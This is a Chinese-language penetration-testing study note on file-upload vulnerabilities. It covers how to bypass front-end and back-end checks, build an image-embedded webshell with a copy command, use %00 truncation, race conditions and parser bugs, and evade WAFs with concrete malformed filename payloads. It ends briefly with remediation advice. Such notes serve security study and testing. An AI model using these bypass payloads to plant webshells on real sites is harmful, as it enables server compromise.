# 文件上传技术

## 文件上传常见验证：
```
后缀名，类型，文件头等
后缀名黑名单白名单
MIME信息/内容头
通过查看源码/抓包绕过
```

目标做前端校验的时候，可以本地保存然后修改校验js代码，再在用来提交的代码中设置action参数来提交，如此可以绕过前端校验，而平常的burp抓包方法，虽然可以绕过上传代码写在php中的情况，但没法绕过上传代码直接写在js里的情况（因为数据包可能抓不到）

```
%00截断：放在文件名内绕过检测
get会自动解码，而post下不会，所以post时需要把%00进行url编码为%25%30%30
```

## 内容逻辑数组绕过：

图片一句话命令行生成：`copy 1.png /b + shell.php /a webshell.jpg`

逻辑安全：
    二次渲染：网站接受目标之后会再进行操作
    条件竞争：网站允许文件上传之后再进行验证，而上传过程验证不严，文件会暂存于服务器上，可以在程序操作前访问文件进行占用
目录命名：`x.php/.`
脚本函数漏洞：`CVE-2015-2348`
数组接受+目录命名

解析漏洞：Nginx，IIS，apache等

文件上传+文件包含

编辑器解析漏洞（Fckeditor等）

文件上传实战思路：检查中间件：`解析漏洞/CMS漏洞/编辑器漏洞/CVE等`，字典扫描：扫描会员中心，文件上传的位置

## 文件上传绕过WAF：
修改`Content-Disposition`,`filename`,`Content-Type`等
常见绕过方法：
```
    数据溢出：关键点前面写入大量的无用数据来干扰对后面主要数据的检测
    符号变异：通过单双引号干扰waf
    数据截断：%00; 换行
    重复数据：匹配多次
```
大量垃圾数据缓冲溢出（`Content-Disposition`,`filename`等）
符号干扰：
```
    filename=x.php
    filename="x.php
    filename='x.php
    filename="a.jpg;.php";
filename="a.php%00.jpg"
filename="Content-Disposition:form-data;name="upload_file";x.php"
filename="x.jpg";filename="x.jpg";......filename="x.php";
filename=
"
x
.
p
h
p
"
;
```

## 文件上传修复：
后端验证后缀，基于黑名单，白名单过滤MIME，基于上传自带类型，进行文件头和完整性检测
自带函数过滤，自定义函数过滤，WAF防护产品：宝塔，云盾，其他产品
